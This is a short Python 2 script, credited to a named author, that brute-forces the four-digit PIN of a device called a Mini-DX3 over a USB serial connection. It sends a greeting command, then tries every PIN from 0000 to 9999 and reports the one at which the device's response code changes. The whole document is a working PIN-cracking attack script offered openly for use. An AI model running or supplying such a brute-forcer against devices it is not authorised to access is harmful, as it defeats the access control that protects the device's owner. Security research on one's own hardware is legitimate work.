#!/usr/bin/python
"""
dh.py - brute forcer for Mini-DX3 PIN -  Nick Besant hwf@fesk.net

Assumes connection over serial (to /dev/tty/USB0).

Will iterate all possible PINs and alert when response changes for specific PIN.

Very basic.


"""
import serial,sys
from time import sleep

s=serial.Serial()
s.port='/dev/ttyUSB0'
s.baudrate=19200

print 'Opening/reopening...'
s.open()
sleep(0.5)
s.close()
sleep(0.5)
s.open()

print 'Sending hello'
s.write('\2O\r')
sleep(0.1)

if s.inWaiting()>0:
    print 'Got response;'
    while s.inWaiting()>0:
        c=s.read(1)
        print c,
    print '\n-----'
else:
    print 'Nothing waiting'
    sys.exit()
    
print 'Starting PIN tries...'

ctr=0

for c in range(10000):
    pin=str(c)
    
    if len(pin)==1:
        pin='000%s' % pin
    elif len(pin)==2:
        pin='00%s' % pin
    elif len(pin)==3:
        pin='0%s' % pin        
    s.write('\2L%s\r' % pin)
    sleep(0.2)
    if s.inWaiting()>0:
        responselen=s.inWaiting()
        rsp=s.read(responselen)
        if rsp[1:4]=='N00':
            print '.',
            if ctr==500:
                print pin,
                ctr=0
            else:
                ctr+=1
        else:
            print 'Response code changed at %s' % pin
        sys.stdout.flush()
    else:
        print 'Died at %s' % str(pin)
        

